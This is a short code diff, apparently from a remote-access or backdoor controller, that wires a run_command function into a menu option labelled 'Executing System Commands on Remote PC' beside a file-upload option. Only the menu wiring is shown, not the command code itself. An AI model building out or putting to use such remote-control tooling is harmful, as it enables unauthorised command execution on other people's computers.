@@ -1,3 +1,5 @@
+from core.features.command import run_command
+
 
 def show_options():
     print("\n")
@@ -18,6 +20,7 @@ def handleConnection(my_socket):
         my_socket.send_data(user_option)
         if user_option == "1":
             print("\t\t[+] Executing System Commands on Remote PC")
+            run_command(my_socket)
         elif user_option == "2":
             print("\t\t[+] Uploading Files to Remote PC")
         elif user_option == "3":
